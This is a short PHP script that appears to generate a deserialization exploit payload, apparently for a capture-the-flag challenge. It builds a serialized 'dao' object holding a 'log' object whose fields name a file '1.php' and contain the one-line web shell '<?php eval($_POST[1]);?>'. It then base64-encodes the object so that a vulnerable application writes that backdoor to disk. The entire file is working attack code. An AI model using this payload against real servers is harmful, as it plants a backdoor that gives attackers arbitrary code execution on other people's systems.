<?php
class log{
	public $title='1.php'; 
	public $info='<?php eval($_POST[1]);?>';
}

class dao{
	private $conn;
	function __construct(){
	    $this->conn=new log();
	}
}

$d =new dao();
echo base64_encode(serialize($d));
?>